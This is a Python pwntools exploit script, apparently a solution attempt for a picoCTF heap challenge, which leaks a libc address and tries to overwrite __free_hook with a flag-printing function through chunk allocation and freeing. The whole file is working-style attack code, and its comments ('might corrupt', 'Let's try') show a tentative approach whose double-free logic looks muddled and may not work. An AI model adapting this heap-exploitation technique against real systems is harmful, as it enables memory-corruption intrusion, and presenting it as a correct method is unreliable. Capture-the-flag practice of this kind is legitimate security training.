#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

context.log_level = 'info'
context.arch = 'amd64'

p = remote(HOST, PORT)

# Dialog
p.recvuntil(b'So, you want to be a hero?')
p.sendline(b'y')

# Get leak
data = p.recvuntil(b'>')
leak = int(data.split(b'Take this: ')[1].split(b'\n')[0], 16)
log.info(f"Leak: 0x{leak:x}")

libc_base = leak - 0x21fd0
log.info(f"Libc base: 0x{libc_base:x}")

# Addresses
WIN_FUNCTION = 0x400a02  # Function that prints flag.txt
free_hook = libc_base + 0x1e75a8

# Strategy: Double free to get arbitrary write

# Allocate 2 chunks of same size
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'24')
p.recvuntil(b'description')
p.sendline(b'A' * 24)
p.recvuntil(b'>')
log.info("Allocated chunk 0")

p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'24')
p.recvuntil(b'description')
p.sendline(b'B' * 24)
p.recvuntil(b'>')
log.info("Allocated chunk 1")

# Allocate a guard chunk
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'24')
p.recvuntil(b'description')
p.sendline(b'C' * 24)
p.recvuntil(b'>')
log.info("Allocated chunk 2 (guard)")

# Free chunk 0
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'0')
p.recvuntil(b'>')
log.info("Freed chunk 0")

# Free chunk 1
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'1')
p.recvuntil(b'>')
log.info("Freed chunk 1")

# Allocate back with poisoned fd
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'24')
p.recvuntil(b'description')

# The null byte overflow happens here
# We write 24 bytes but byte 25 gets nulled
# This might corrupt the next chunk's metadata

# Let's try to write free_hook address
payload = p64(free_hook)
payload += b'D' * 16
p.send(payload)
p.recvuntil(b'>')
log.info("Allocated with potential poison")

# Allocate again
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'24')
p.recvuntil(b'description')
p.sendline(b'E' * 24)
p.recvuntil(b'>')

# Try to allocate at free_hook
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'8')
p.recvuntil(b'description')
p.send(p64(WIN_FUNCTION))
p.recvuntil(b'>')
log.info("Attempted to overwrite free_hook")

# Free to trigger
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'2')  # Free the guard chunk

# Get output
try:
    output = p.recvall(timeout=2)
    if b'picoCTF' in output:
        start = output.index(b'picoCTF')
        end = output.index(b'}', start) + 1
        log.success(f"FLAG: {output[start:end].decode()}")
    else:
        log.info(f"Output: {output}")
except:
    p.interactive()

p.close()